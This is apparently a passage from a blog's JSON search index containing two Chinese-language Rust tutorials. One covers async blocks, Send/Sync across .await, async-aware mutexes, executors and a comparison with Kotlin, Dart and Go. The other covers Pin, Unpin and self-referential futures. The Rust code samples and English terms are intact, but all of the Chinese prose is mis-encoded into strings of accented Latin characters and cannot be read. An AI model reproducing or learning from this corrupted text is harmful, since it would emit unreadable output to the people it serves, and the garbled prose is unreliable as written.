çš„æ–¹å¼æ•è·å¤–éƒ¨å€¼ï¼Œå¥½å¤„æ˜¯ç”Ÿå‘½å‘¨æœŸå¯ä»¥è¶…å‡ºè¯¥å˜é‡åŸæ¥çš„ä½œç”¨åŸŸã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 /// `async` block: /// /// Multiple different `async` blocks can access the same local variable /// so long as they're executed within the variable's scope async fn blocks() { let my_string = \"foo\".to_string(); let future_one = async { // ... println!(\"{my_string}\"); }; let future_two = async { // ... println!(\"{my_string}\"); }; // Run both futures to completion, printing \"foo\" twice: let ((), ()) = futures::join!(future_one, future_two); } /// `async move` block: /// /// Only one `async move` block can access the same captured variable, since /// captures are moved into the `Future` generated by the `async move` block. /// However, this allows the `Future` to outlive the original scope of the /// variable: fn move_block() -\u003e impl Future\u003cOutput = ()\u003e { let my_string = \"foo\".to_string(); async move { // ... println!(\"{my_string}\"); } } Future çš„è·¨çº¿ç¨‹ç§»åŠ¨ å½“ä½¿ç”¨å¤šçº¿ç¨‹æ‰§è¡Œå™¨æ—¶ï¼Œ Future å¯èƒ½ä¼šè·¨çº¿ç¨‹ç§»åŠ¨ (move), è¿™ç§ç§»åŠ¨å‘ç”Ÿåœ¨ .await è°ƒç”¨æ—¶ã€‚å› æ­¤ï¼Œå½“å˜é‡çš„ä½œç”¨åŸŸæ¶‰åŠè·¨ .await è°ƒç”¨æ—¶ï¼š\nè¯¥å˜é‡ç±»å‹è¦æ±‚å®ç° Send trait å¦‚æœæ¶‰åŠå¼•ç”¨ï¼Œåˆ™è¦æ±‚å®ç° Sync trait Future å’Œ Pin å…³äº Pin çš„è§£é‡Šä»¥åŠä½¿ç”¨åœºæ™¯ï¼Œå¯ä»¥å‚è€ƒæˆ‘ä¹‹å‰å‘å¸ƒçš„ Rust ä¸­çš„ Pin, Unpin å’Œ !Unpin ä¸€æ–‡ã€‚\nä¼ ç»Ÿäº’æ–¥ä½“çš„å±€é™æ€§ ç”±äº Future æ½œåœ¨çš„è·¨çº¿ç¨‹ç§»åŠ¨ç‰¹æ€§ï¼Œåœ¨ä½¿ç”¨ Mutex æ—¶ä¹Ÿéœ€è¦æ³¨æ„ï¼Œä¸èƒ½åœ¨è·¨ .await è°ƒç”¨ä¸­æŒæœ‰ä¼ ç»Ÿçš„ non-futures-aware é”ï¼Œå› ä¸ºè¿™æ ·åšå¯èƒ½ä¼šå¯¼è‡´æ­»é”çš„å‘ç”Ÿã€‚\næ­»é”æ¡ˆä¾‹åˆ†æï¼ˆå…¶ä¸­ task çš„æ¦‚å¿µåœ¨åæ–‡ä¸­æœ‰è§£é‡Šï¼‰ï¼š\nå‡è®¾ task A å’Œ task B å…±äº«åŒä¸€æŠŠé” L task A å…ˆæ‹¿åˆ°é” L task A ä¸­æ‰§è¡Œäº† .await, å¹¶å°†å½“å‰çº¿ç¨‹è®©åº¦ç»™ task B task B æ‰§è¡Œè·å–é” L çš„æ“ä½œã€‚ç”±äºæ­¤æ—¶ L å·²ç»è¢« task A æ‰€æŒæœ‰ï¼Œä¸” task A å·²ç»æŒ‚èµ·æ²¡æœ‰æœºä¼šå†é‡Šæ”¾é” L, å› æ­¤ task B æ°¸è¿œæ‹¿ä¸åˆ°è¯¥é”ï¼Œä»è€Œå¯¼è‡´æ­»é”å‘ç”Ÿã€‚ Task B è¦æƒ³é¡ºåˆ©æ‹¿åˆ°è¯¥é”ï¼Œåº”è¯¥è¦å…·å¤‡ä¸¤ä¸ªæ¡ä»¶ï¼š\ntask A å’Œ task B åœ¨åŒä¸€ä¸ªçº¿ç¨‹å†…è°ƒåº¦æ‰§è¡Œ L æ˜¯ä¸€æŠŠå¯é‡å…¥é” (reentrant lock) å› æ­¤ï¼Œè¿™ç§æƒ…å†µä¸‹åº”è¯¥ä½¿ç”¨ futures::lock::Mutex (å¦‚æœä½¿ç”¨çš„æ˜¯ tokio è¿è¡Œæ—¶ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ tokio::sync::Mutex), è€Œä¸æ˜¯ std::sync::Mutex ã€‚\næ›´å¤šç»†èŠ‚è¯·å‚è€ƒï¼š\nasync/await Shared state | Tokio å†…éƒ¨å®ç°åˆ†æï¼šTask, Executor å’Œ Spawner è¦è¿›ä¸€æ­¥ç†è§£ Rust å¼‚æ­¥ç¼–ç¨‹ï¼ŒTask, Executor å’Œ Spawner è¿™å‡ ä¸ªæ¦‚å¿µä¸å¯é¿å…ã€‚ä¸‹é¢å¯¹è¿™äº›æ¦‚å¿µè¿›è¡Œé€ä¸€è§£é‡Šã€‚\nTask Task æ˜¯å¯¹ä¸€ä¸ªæˆ–å¤šä¸ª Future çš„å°è£…ï¼Œä»£è¡¨äº†ä¸€ä¸ªå¯ä»¥è¢« Executor æ‰§è¡Œçš„ç‹¬ç«‹çš„å¼‚æ­¥å·¥ä½œå•å…ƒã€‚ ä¸€ä¸ª Task é€šå¸¸ä¼šåŒ…å«ä¸€ä¸ªé¡¶å±‚ Futureï¼Œè¿™ä¸ª Future å¯èƒ½ä¼šä¾èµ–å…¶ä»–æ›´å¤šçš„ Futureã€‚ Task åœ¨è¢«åˆ›å»ºåä¼šè¢«æäº¤ç»™ Executorï¼Œç”± Executor è´Ÿè´£è°ƒåº¦å’Œæ‰§è¡Œã€‚ Executor Executor æ˜¯ä¸€ä¸ªè´Ÿè´£è°ƒåº¦å’Œæ‰§è¡Œ Task çš„ç»„ä»¶ã€‚ å®ƒä¼šä¸æ–­è½®è¯¢å·²ç»æäº¤ç»™å®ƒçš„ Taskï¼Œé€šè¿‡è°ƒç”¨ Task å†…éƒ¨ Future çš„ poll æ–¹æ³•æ¥é©±åŠ¨è¿™äº› Future å‘å®ŒæˆçŠ¶æ€å‰è¿›ã€‚ Executor å¯ä»¥æ˜¯å•çº¿ç¨‹çš„ï¼Œä¹Ÿå¯ä»¥æ˜¯å¤šçº¿ç¨‹çš„ï¼Œä»¥æ”¯æŒä¸åŒçš„å¹¶å‘éœ€æ±‚ã€‚ Spawner Spawner æ˜¯ä¸€ä¸ªç”¨äºåˆ›å»ºå’Œæäº¤ Task åˆ° Executor çš„ç»„ä»¶ã€‚ åœ¨ä¸€äº›å¼‚æ­¥è¿è¡Œæ—¶ï¼ˆå¦‚ tokio æˆ– async-stdï¼‰ä¸­ï¼ŒSpawner é€šå¸¸æ˜¯ä¸ Executor ç´§å¯†ç»‘å®šçš„ï¼Œæä¾›äº†æ–¹ä¾¿çš„æ¥å£æ¥å¯åŠ¨æ–°çš„ Taskã€‚ åœ¨ Build an Executor è¿™ä¸ªç¤ºä¾‹ä¸­ï¼ŒSpawner å†…éƒ¨æŒæœ‰ä¸€ä¸ª channel çš„ Sender, è€Œ Executor åˆ™æŒæœ‰è¯¥ channel å¯¹åº”çš„ Receiver, ç”¨äºæ¥æ”¶ Spawner å‘é€è¿‡æ¥çš„ taskã€‚ Executor ä¼šåœ¨ä¸€ä¸ªå¾ªç¯ä¸­æŒç»­æ¥æ”¶ task å¹¶æ‰§è¡Œ poll é€»è¾‘ã€‚ å¯¹ Build an Executor ç¤ºä¾‹çš„å‡ ç‚¹ç†è§£ Future å…ˆè¢« Box è£…ç®±, ç„¶åå­˜åœ¨ Task ä¸­ Task è¢«åŒ…è£…åœ¨ Arc ä¸­ï¼Œä»¥ä¾¿è·¨çº¿ç¨‹å…±äº«æ‰€æœ‰æƒ Task ä¸­é™¤äº† Future, è¿˜åŒ…å«ä¸€ä¸ª task_sender task_sender æ˜¯ channel çš„ Sender çš„å…‹éš† è¯¥ sender ç”¨æ¥åœ¨è¢«å”¤é†’æ—¶ï¼Œé‡æ–°å°†è¯¥ Task å‘é€åˆ° channel é˜Ÿåˆ—ä¸­ï¼Œä»¥ä¾¿ executor é‡æ–°è°ƒåº¦æ‰§è¡Œè¯¥ Taskã€‚ Executor ä¸­åŒ…å«ä¸€ä¸ª channel çš„ Receiver, ä¸æ–­æ¥æ”¶ task, å–å‡º Future å¹¶æ‰§è¡Œ pollã€‚ poll æœ‰ä¸€ä¸ª context å‚æ•°ï¼Œæ˜¯ Executor åˆ›å»ºçš„ï¼Œcontext ä¸­åŒ…å«äº† wakerã€‚ waker åº•å±‚å…¶å®å°±æ˜¯ task çš„å¼•ç”¨ï¼Œåªæ˜¯ä»¥ Waker æ¥å£çš„å½¢å¼å­˜åœ¨ã€‚å½“ä»»åŠ¡é˜»å¡æ—¶ä¼šæ³¨å†Œåˆ°æŸä¸ªè§¦å‘å™¨å½“ä¸­ï¼ˆä¾‹å¦‚ timer, æˆ–è€… epoll äº‹ä»¶ç­‰ï¼‰ã€‚ äº‹ä»¶è§¦å‘æ—¶ï¼Œæ„å‘³ç€ä»»åŠ¡å¯ä»¥ç»§ç»­æ‰§è¡Œã€‚æ­¤æ—¶ä¼šè°ƒç”¨ waker.wake() æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¼šè°ƒåˆ° Task è‡ªèº«å®ç°çš„ ArcWake trait ä¸­çš„ wake_by_ref æ–¹æ³•ï¼Œè¿™é‡Œé¢å°±ä¼šè°ƒç”¨ task_sender.send() å°† task çš„å…‹éš†é‡æ–°å‘é€åˆ° channel ä¸­ã€‚ å’Œå…¶ä»–è¯­è¨€çš„æ¨ªå‘å¯¹æ¯” Rust çš„å¼‚æ­¥å’Œå…¶ä»–è¯­è¨€ç›¸æ¯”ï¼Œæœ€æ˜¾è‘—çš„ç‰¹ç‚¹å°±æ˜¯ Future çš„æƒ°æ€§ã€‚\nä¸‹é¢åˆ†åˆ«å¯¹ Rust, Kotlin, Dart å’Œ Go è¿™å‡ ç§è¯­è¨€çš„å¼‚æ­¥ç‰¹æ€§è¿›è¡Œä¸€ä¸ªç®€å•çš„æ¦‚æ‹¬æ€§ä»‹ç»ï¼Œå¸Œæœ›é€šè¿‡è¿™ç§å¯¹æ¯”æ¥åŠ æ·±å¯¹ Rust å¼‚æ­¥ç‰¹æ€§çš„ç†è§£ã€‚\nRust çš„å¼‚æ­¥ æ‡’æ‰§è¡Œï¼ˆLazy Executionï¼‰ åœ¨ Rust ä¸­ï¼Œå½“ä½ å®šä¹‰ä¸€ä¸ª async å‡½æ•°æ—¶ï¼Œè°ƒç”¨è¿™ä¸ªå‡½æ•°å®é™…ä¸Šå¹¶ä¸ä¼šç«‹å³æ‰§è¡Œå®ƒçš„ä»£ç ã€‚ç›¸åï¼Œå®ƒè¿”å›ä¸€ä¸ªæœªæ‰§è¡Œçš„ futureã€‚è¿™ä¸ª future å¿…é¡»è¢«æ˜¾å¼åœ°è½®è¯¢ï¼ˆpollï¼‰ï¼Œé€šå¸¸æ˜¯åœ¨ä¸€ä¸ªå¼‚æ­¥ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ .await ï¼Œæˆ–è€…ä½¿ç”¨æŸç§æ‰§è¡Œå™¨ï¼ˆexecutorï¼‰æ¥é©±åŠ¨ã€‚ é›¶æˆæœ¬æŠ½è±¡ï¼ˆZero-Cost Abstractionsï¼‰ Rust çš„å¼‚æ­¥å®ç°æ—¨åœ¨å°½å¯èƒ½å‡å°‘è¿è¡Œæ—¶å¼€é”€ã€‚å®ƒé€šè¿‡çŠ¶æ€æœºçš„è½¬æ¢æ¥å®ç°å¼‚æ­¥æ“ä½œï¼Œå¹¶ä¸ç›´æ¥ä¾èµ–äºçº¿ç¨‹æˆ–å…¶ä»–é‡é‡çº§çš„å¹¶å‘æœºåˆ¶ã€‚ Rust é€šè¿‡åœ¨ç¼–è¯‘æ—¶å°† async å‡½æ•°è½¬æ¢æˆçŠ¶æ€æœºæ¥å®ç°å¼‚æ­¥å‡½æ•°çš„è¿è¡Œã€æŒ‚èµ·å’Œæ¢å¤ã€‚è¿™ç§æ–¹æ³•å…è®¸ç²¾ç»†æ§åˆ¶å¼‚æ­¥æ“ä½œçš„æ‰§è¡Œï¼ŒåŒæ—¶ä¸ Rust çš„é›¶æˆæœ¬æŠ½è±¡åŸåˆ™ç›¸ç¬¦ã€‚\næ˜ç¡®çš„æ‰€æœ‰æƒå’Œå€Ÿç”¨ ç”±äº Rust çš„æ‰€æœ‰æƒå’Œå€Ÿç”¨è§„åˆ™ï¼Œå¼‚æ­¥ä»£ç åœ¨ç¼–è¯‘æ—¶å°±èƒ½æœ€å¤§é™åº¦çš„é¿å…æ•°æ®ç«äº‰å’Œå¹¶å‘ç›¸å…³çš„å®‰å…¨æ€§é—®é¢˜ã€‚ Kotlin çš„å¼‚æ­¥ åç¨‹ï¼ˆCoroutinesï¼‰ Kotlin ä½¿ç”¨åç¨‹æ¥å¤„ç†å¼‚æ­¥æ“ä½œï¼Œè¿™æ˜¯ä¸€ç§è½»é‡çº§çš„çº¿ç¨‹ã€‚Kotlin çš„åç¨‹æ˜¯ç«‹å³æ‰§è¡Œçš„ã€‚ Kotlin ä¸­çš„åç¨‹ä¹Ÿæ˜¯é€šè¿‡ç¼–è¯‘æ—¶è½¬æ¢æ¥å®ç°çš„ã€‚å½“ä½ åœ¨ Kotlin ä¸­ä½¿ç”¨åç¨‹æ—¶ï¼Œç¼–è¯‘å™¨ä¼šå°†åç¨‹ä»£ç è½¬æ¢ä¸ºçŠ¶æ€æœºï¼ˆå‚è€ƒ Kotlin language specificationï¼‰ã€‚è¿™ç§è½¬æ¢ç±»ä¼¼äº Rust çš„å¤„ç†æ–¹å¼ï¼Œä½†åœ¨ç»†èŠ‚ä¸Šæœ‰æ‰€ä¸åŒï¼Œæœ€å¤§çš„åŒºåˆ«æ˜¯ Kotlin çš„åç¨‹æ˜¯åŸºäº JVM çš„ï¼Œå› æ­¤å®ƒä»¬å¿…é¡»åœ¨ JVM çš„é™åˆ¶å’Œç‰¹æ€§ï¼ˆå¦‚åƒåœ¾æ”¶é›†ã€JVM çº¿ç¨‹æ¨¡å‹ç­‰ï¼‰ä¸‹å·¥ä½œã€‚\nç»“æ„åŒ–å¹¶å‘ï¼ˆStructured Concurrencyï¼‰ Kotlin å¼ºè°ƒåœ¨åç¨‹ä¸­ä½¿ç”¨ç»“æ„åŒ–å¹¶å‘ï¼Œè¿™æœ‰åŠ©äºé˜²æ­¢å¸¸è§çš„å¹¶å‘ç›¸å…³é”™è¯¯ã€‚ ä¸Šä¸‹æ–‡æ„ŸçŸ¥ Kotlin åç¨‹å¯ä»¥å¾ˆå®¹æ˜“åœ°åˆ‡æ¢ä¸Šä¸‹æ–‡ï¼Œä¾‹å¦‚ä»åå°çº¿ç¨‹åˆ‡æ¢åˆ°ä¸»çº¿ç¨‹ã€‚ ç»“æ„åŒ–å¹¶å‘ åœ¨ Kotlin ä¸­ï¼Œå½“ä½ å¯åŠ¨ä¸€ä¸ªåç¨‹ï¼Œå®ƒæ€»æ˜¯ä¸ä¸€ä¸ªç‰¹å®šçš„ä½œç”¨åŸŸï¼ˆåç¨‹ä½œç”¨åŸŸï¼‰ç›¸å…³è”ã€‚è¿™ä¸ªä½œç”¨åŸŸè´Ÿè´£ç®¡ç†åç¨‹çš„ç”Ÿå‘½å‘¨æœŸï¼ŒåŒ…æ‹¬å¯åŠ¨å’Œå–æ¶ˆã€‚ç»“æ„åŒ–å¹¶å‘çš„å…³é”®ç‚¹åœ¨äºï¼š\nä½œç”¨åŸŸç»‘å®š æ¯ä¸ªåç¨‹éƒ½è¿è¡Œåœ¨ä¸€ä¸ªæ˜ç¡®çš„ä½œç”¨åŸŸå†…ï¼Œè¿™ä¸ªä½œç”¨åŸŸå®šä¹‰äº†åç¨‹çš„ç”Ÿå‘½å‘¨æœŸã€‚åç¨‹åªåœ¨è¿™ä¸ªä½œç”¨åŸŸå†…æ´»åŠ¨ï¼Œä¸€æ—¦ä½œç”¨åŸŸç»“æŸï¼Œæ‰€æœ‰åœ¨è¿™ä¸ªä½œç”¨åŸŸä¸­å¯åŠ¨çš„åç¨‹ä¹Ÿä¼šè¢«è‡ªåŠ¨å–æ¶ˆã€‚ çˆ¶å­å…³ç³» åœ¨ç»“æ„åŒ–å¹¶å‘ä¸­ï¼Œçˆ¶åç¨‹ä¼šç­‰å¾…å…¶æ‰€æœ‰å­åç¨‹å®Œæˆã€‚å¦‚æœçˆ¶åç¨‹è¢«å–æ¶ˆï¼Œæ‰€æœ‰çš„å­åç¨‹ä¹Ÿä¼šè¢«å–æ¶ˆã€‚ å¼‚å¸¸ä¼ æ’­ åœ¨å­åç¨‹ä¸­å‘ç”Ÿçš„å¼‚å¸¸ä¼šè¢«ä¼ æ’­åˆ°çˆ¶åç¨‹ä¸­ï¼Œè¿™ä½¿å¾—å¼‚å¸¸å¤„ç†æ›´åŠ ä¸€è‡´å’Œå¯é¢„æµ‹ã€‚ Dart çš„å¼‚æ­¥ äº‹ä»¶å¾ªç¯ï¼ˆEvent Loopï¼‰ Dart ä½¿ç”¨å•çº¿ç¨‹äº‹ä»¶å¾ªç¯æ¨¡å‹ï¼Œæ‰€æœ‰çš„å¼‚æ­¥æ“ä½œéƒ½æ˜¯å›´ç»•è¿™ä¸ªäº‹ä»¶å¾ªç¯æ¥è°ƒåº¦çš„ã€‚ Future å’Œ Stream Dart ä¸­çš„å¼‚æ­¥æ¨¡å¼ä¸»è¦æ˜¯é€šè¿‡ Future å’Œ Stream å®ç°çš„ã€‚ Go çš„å¼‚æ­¥ åç¨‹ï¼ˆGoroutinesï¼‰ Go ä½¿ç”¨ Goroutines æ¥å¤„ç†å¹¶å‘ï¼Œè¿™æ˜¯ä¸€ç§éå¸¸è½»é‡çº§çš„çº¿ç¨‹ã€‚Goroutines åœ¨åˆ›å»ºæ—¶å°±å¼€å§‹æ‰§è¡Œã€‚ é€šé“ï¼ˆChannelsï¼‰ Go ä½¿ç”¨ chan æ¥åœ¨ Goroutines ä¹‹é—´è¿›è¡Œé€šä¿¡ï¼Œè¿™æ˜¯ä¸€ç§éå¸¸å¼ºå¤§çš„å¹¶å‘æ¨¡å‹ã€‚ ç®€å•ç›´æ¥ Go çš„å¹¶å‘æ¨¡å‹éå¸¸ç®€å•ç›´æ¥ï¼Œæ˜“äºç†è§£å’Œä½¿ç”¨ã€‚ å‚è€ƒèµ„æ–™ Asynchronous Programming in Rust futures - Rust Tokio - An asynchronous Rust runtime Kotlin language specification Asynchronous Programming in Dart Rust ä¸­çš„ Pin, Unpin å’Œ !Unpin ","description":"","tags":["rust","async"],"title":"ç†è§£ Rust å¼‚æ­¥ç¼–ç¨‹","uri":"/posts/understanding-async-rust/"},{"categories":null,"content":"ä¸ºä»€ä¹ˆéœ€è¦ Pin? å¼•å…¥ Pin çš„ç›®çš„ä¸»è¦æ˜¯ä¸ºäº†æ”¯æŒ è‡ªå¼•ç”¨ç±»å‹ (self-referential types) ã€‚ä¸‹é¢æˆ‘ä»¬ä»¥ Future ä¸ºä¾‹ï¼Œè§£é‡Šä¸€ä¸‹è‡ªå¼•ç”¨ç±»å‹ä»¥åŠå¼•å…¥ Pin çš„å¿…è¦æ€§ã€‚\nç”±äºå¼‚æ­¥å—/å¼‚æ­¥å‡½æ•°ä¸­å¯èƒ½åŒ…å«å¯¹å±€éƒ¨å˜é‡çš„å¼•ç”¨ï¼Œä¾‹å¦‚ä¸‹é¢çš„ä»£ç ï¼š\n1 2 3 4 5 6 async { let mut x = [0; 128]; let read_into_buf_fut = read_into_buf(\u0026mut x); read_into_buf_fut.await; println!(\"{:?}\", x); } è¿™ç±»ä»£ç åœ¨ç”Ÿæˆ Future ç»“æ„æ—¶ï¼Œå°±ä¼šå‡ºç° è‡ªå¼•ç”¨ç±»å‹ (self-referential types) ã€‚ä¾‹å¦‚ï¼Œä¸Šé¢çš„ä»£ç å¯èƒ½ç”Ÿæˆç±»ä¼¼ä¸‹é¢çš„ Future ç»“æ„ï¼š\n1 2 3 4 5 6 7 8 struct ReadIntoBuf\u003c'a\u003e { buf: \u0026'a mut [u8], // points to `x` below } struct AsyncFuture { x: [u8; 128], read_into_buf_fut: ReadIntoBuf\u003c'what_lifetime?\u003e, } è¿™ç±»ç»“æ„å¦‚æœä¸èƒ½ä¿è¯ self åœ°å€çš„ç¨³å®šæ€§ï¼Œåˆ™ä¼šå‡ºç°ä¸¥é‡çš„å®‰å…¨éšæ‚£ã€‚ä¾‹å¦‚ï¼Œå¦‚æœ AsyncFuture å‘ç”Ÿäº†ç§»åŠ¨ï¼Œåˆ™ x çš„åœ°å€ä¹Ÿä¼šå‘ç”Ÿå˜åŒ–ï¼Œä»è€Œå¯¼è‡´ ReadIntoBuf ä¸­å­˜å‚¨çš„ buf æŒ‡é’ˆå¤±æ•ˆã€‚\nè¦é˜²æ­¢è¯¥é—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦å¼•å…¥ Pin æ¥ç¡®ä¿ self åœ°å€çš„ç¨³å®šæ€§ï¼Œä»¥ä¾¿åœ¨ async å—ä¸­å®‰å…¨åœ°åˆ›å»ºå¼•ç”¨ã€‚\næ›´å¤šç»†èŠ‚å¯å‚è€ƒ Pinning - Asynchronous Programming in Rustã€‚\nPin æ˜¯ä»€ä¹ˆï¼Ÿ Pin\u003cP\u003e æ˜¯ä¸€ä¸ª struct, å¯ç”¨äºåŒ…è£…ä»»æ„çš„æŒ‡é’ˆç±»å‹ P, è€Œ Unpin å’Œ !Unpin éƒ½æ˜¯ trait ã€‚\nPin\u003cP\u003e æ˜¯ä¸€ä¸ªæ™ºèƒ½æŒ‡é’ˆï¼Œå¯ä¿è¯å…¶åŒ…è£…çš„æŒ‡é’ˆ P åé¢çš„å€¼ä¸ä¼šå‘ç”Ÿç§»åŠ¨ï¼ˆå³ç‰©ç†åœ°å€ä¿æŒç¨³å®šä¸”æœ‰æ•ˆï¼‰ï¼Œå‰ææ˜¯å…¶ç›®æ ‡ç±»å‹æ²¡æœ‰å®ç° Unpin ã€‚\nä¾‹å¦‚ï¼Œ Pin\u003c\u0026mut T\u003e, Pin\u003c\u0026T\u003e, Pin\u003cBox\u003cT\u003e\u003e éƒ½èƒ½ä¿è¯ T ä¸ä¼šå‘ç”Ÿç§»åŠ¨ï¼Œå¦‚æœ T: !Unpin ã€‚\nå¤§å¤šæ•°ç±»å‹åœ¨ç§»åŠ¨æ—¶éƒ½æ²¡å•¥é—®é¢˜ï¼Œè¿™äº›ç±»å‹å®ç°äº†ä¸€ä¸ªå« Unpin çš„ traitã€‚\nå¯¹äºè¿™äº›ç±»å‹æ¥è®²ï¼ŒPin å‰å’Œ Pin ååœ¨ä½¿ç”¨ä¸ŠåŸºæœ¬ä¸€æ ·ï¼Œä¸å—å½±å“ã€‚ä¾‹å¦‚ Pin\u003c\u0026mut u8\u003e çš„è¡Œä¸ºå’Œ \u0026mut u8 æ²¡å•¥åŒºåˆ«ã€‚\nç”±äºæ ‡å‡†åº“ä¸º Unpin æä¾›äº† DerefMut çš„ä¸€æ½å­å®ç°ï¼Œå› æ­¤ï¼Œå¦‚æœ T å®ç°äº† Unpin trait, åˆ™å¯ä»¥é€šè¿‡ Deref Coercion è‡ªåŠ¨è·å¾— Pin å¯¹è±¡çš„å¯å˜å¼•ç”¨ \u0026mut T, ä¹Ÿå¯ä»¥é€šè¿‡ Pin::get_mut æ–¹æ³•æ‰‹åŠ¨è·å– \u0026mut T, è¿™æ„å‘³ç€å¯ä»¥å®‰å…¨åœ°å¯¹ T è¿›è¡Œä¿®æ”¹ã€‚\nè¯¦æƒ…å¯å‚è€ƒ Pin çš„ä¸å¯ç§»åŠ¨æ€§æ˜¯é€šè¿‡ç¼–è¯‘å™¨æ¥ä¿è¯çš„ ã€‚\nå¦‚æœ T å¸¦æœ‰ !Unpin markerï¼Œä¸€æ—¦è¢« pin åˆ™ T ä¸å¯ç§»åŠ¨ã€‚\nFuture å°±æ˜¯ä¸€ä¸ª !Unpin çš„ä¾‹å­ã€‚ å¤§å¤šæ•°ç±»å‹é»˜è®¤å®ç°äº† Unpin, å¦‚æœè¦å¼ºåˆ¶å®ç° !Unpin, å¯ä»¥åœ¨ç»“æ„ä½“ä¸­æ·»åŠ ä¸€ä¸ª PhantomPinned å­—æ®µã€‚å‚è€ƒ !Unpin å’Œ Pin\u003cBox\u003cT\u003e\u003e ç¤ºä¾‹ ã€‚ åœ¨ T: !Unpin çš„å‰æä¸‹ï¼Œä¿è¯ T ä¸ä¼šå‘ç”Ÿç§»åŠ¨æ„å‘³ç€ T çš„ç‰©ç†åœ°å€æ˜¯ç¨³å®šä¸”æœ‰æ•ˆçš„ï¼Œæˆ‘ä»¬å¯ä»¥å§‹ç»ˆä¾èµ–è¯¥åœ°å€ã€‚\nè¿™ç‚¹ä¸»è¦é€šè¿‡é™åˆ¶å¯¹ T çš„ä¿®æ”¹æ¥è§£å†³ã€‚å› ä¸ºå¯¹äº T: !Unpin æ¥è¯´ï¼Œæˆ‘ä»¬æ‹¿ä¸åˆ° Pin æ‰€æŒ‡å‘çš„ T çš„å¯å˜å¼•ç”¨ã€‚è¯¦æƒ…å¯å‚è€ƒ Pin çš„ä¸å¯ç§»åŠ¨æ€§æ˜¯é€šè¿‡ç¼–è¯‘å™¨æ¥ä¿è¯çš„ ã€‚\nğŸŒŸ å¯¹ Pin::set æ–¹æ³•çš„ç†è§£ã€‚\nPin::set æ–¹æ³•å¯ä»¥è®¾ç½®ä¸€ä¸ªæ–°çš„ T å€¼ä»¥æ›¿æ¢æ—§å€¼ã€‚è¯·æ³¨æ„ï¼Œè¿™ç§æ›¿æ¢æ°¸è¿œæ˜¯ä¸€ä¸ªå®Œæ•´çš„ã€åˆæ³•çš„ T å€¼æ›¿æ¢å¦ä¸€ä¸ª T å€¼ï¼Œè¿™ç‚¹å’Œç›´æ¥è·å– mut å¼•ç”¨æœ‰æ‰€ä¸åŒï¼Œå› ä¸ºç›´æ¥è·å– mut å¼•ç”¨å¯èƒ½ä¼šå¯¼è‡´ä¸å®‰å…¨çš„ä¿®æ”¹ï¼ˆä¾‹å¦‚å¯¹è‡ªå¼•ç”¨ç±»å‹çš„ swap æ“ä½œï¼‰ã€‚åŒæ—¶ï¼Œ set æ–¹æ³•ä¼šå¼•èµ·æ—§çš„å€¼çš„ææ„ï¼Œå› æ­¤æ˜¯å®‰å…¨çš„ï¼Œæ²¡æœ‰è¿å Pin åè®®ã€‚\nPin å¯ä»¥å‘ç”Ÿåœ¨æ ˆä¸Šï¼Œä¹Ÿå¯ä»¥å‘ç”Ÿåœ¨å †ä¸Šã€‚\næ ˆä¸Šçš„ Pin ä¾èµ–äº unsafe ä»£ç ï¼Œä¸”éœ€è¦ç”± æˆ‘ä»¬è‡ªå·±æä¾›è¢« Pin å€¼çš„ç”Ÿå‘½å‘¨æœŸçš„ä¿è¯ï¼Œå¦åˆ™å¯èƒ½è¿å Pin å¥‘çº¦ã€‚ï¼ˆæ›´æ–°ï¼šRust 1.68 å¼•å…¥äº† å®‰å…¨ç‰ˆæœ¬çš„æ ˆä¸Š pin å® std::pin::pin!() ï¼‰ã€‚å‚è€ƒ !Unpin å’Œ Pin\u003cBox\u003cT\u003e\u003e ç¤ºä¾‹ ã€‚\nå †ä¸Šçš„ Pin ç›´æ¥ç”¨ Box::pin() å³å¯ã€‚å‚è€ƒ Unpin å’Œ Pin\u003cBox\u003cT\u003e\u003e ç¤ºä¾‹ ã€‚\nPin çš„ä¸å¯ç§»åŠ¨æ€§æ˜¯é€šè¿‡ç¼–è¯‘å™¨æ¥ä¿è¯çš„ Pin\u003cP\u003e ä»…ä¸º Target ä¸º Unpin çš„å¯å˜å¼•ç”¨å®ç°äº† DerefMut, å…¶ä»–æƒ…å†µéƒ½åªèƒ½è·å¾— Target çš„ä¸å¯å˜å¼•ç”¨ã€‚\nå‚è€ƒæ ‡å‡†åº“ä¸­çš„ Pin å®ç°ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 impl\u003cP: Deref\u003e Deref for Pin\u003cP\u003e { type Target = P::Target; fn deref(\u0026self) -\u003e \u0026P::Target { Pin::get_ref(Pin::as_ref(self)) } } // ä¸º Target ä¸º Unpin çš„å¯å˜å¼•ç”¨æä¾›çš„ DerefMut å®ç° impl\u003cP: DerefMut\u003cTarget: Unpin\u003e\u003e DerefMut for Pin\u003cP\u003e { fn deref_mut(\u0026mut self) -\u003e \u0026mut P::Target { Pin::get_mut(Pin::as_mut(self)) } } Pin çš„ä½¿ç”¨åœºæ™¯ç¤ºä¾‹ éœ€è¦é€šè¿‡ Future çš„ \u0026mut _ å¼•ç”¨è°ƒç”¨ .await æ–¹æ³•æ—¶ async fn è¿”å›çš„ Future æ˜¯ !Unpin çš„ Future åœ¨è¢« poll ä¹‹å‰ï¼Œå¿…é¡»è¢« pin ä½ ç›´æ¥åœ¨ Future ä¸Šè°ƒç”¨ .await ä¼šè‡ªåŠ¨å¤„ç† pin çš„é€»è¾‘ï¼Œä½†æ˜¯ä¼šå°†è¯¥ Future æ¶ˆè€—æ‰ è¦æƒ³ä¸æ¶ˆè€—æ‰ Future (ä¾‹å¦‚åœ¨ loop é‡Œé¢å¯¹ Future è¿›è¡Œ select!), éœ€è¦é€šè¿‡ mut å¼•ç”¨æ¥è°ƒç”¨ .await æ–¹æ³•ã€‚ é€šè¿‡ mut å¼•ç”¨ .await å‰ï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±æ‰‹åŠ¨å…ˆå°† Future pin ä½ã€‚ Pin æœ‰ä¸¤ç§æ–¹å¼ï¼š åœ¨å †ä¸Š pin: ä½¿ç”¨ Box::pin å°†æ•°æ®åˆ†é…åˆ°å †ä¸Šå¹¶ pin ä½ã€‚ åœ¨æ ˆä¸Š pin: ä½¿ç”¨ tokio::pin! (æˆ–è€… std::pin::pin!) å®ï¼Œå°†æ•°æ® pin åœ¨æ ˆä¸Šã€‚ å‚è€ƒ 